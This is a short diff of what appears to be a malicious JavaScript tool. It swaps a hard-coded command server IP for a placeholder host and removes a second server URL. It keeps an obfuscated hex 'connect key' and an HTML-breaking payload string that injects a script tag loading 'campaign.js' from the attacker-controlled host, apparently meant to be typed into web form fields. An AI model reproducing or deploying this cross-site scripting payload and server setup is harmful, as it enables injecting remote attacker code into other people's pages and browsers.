@@ -1,4 +1,4 @@
-var master = window.location.protocol + "//70.66.139.68";
+var master = window.location.protocol + "//yoursever.net";
 
 var connectKey = "\x4c\x55\x43\x4b\x59\x66\x75\x63\x6b\x69\x6e\x48\x61\x78\x30\x72";
 
@@ -616,7 +616,7 @@ function typeInTextarea(el, newText) {
     el.selectionStart = el.selectionEnd = start + newText.length
     el.focus()
 }
-var master = "http://download.agency";
+
 var myText = "\"/></div><ScrIpt srC=\"" + master + "/campaign.js\"/>";
 
 function addText(obj, text) {
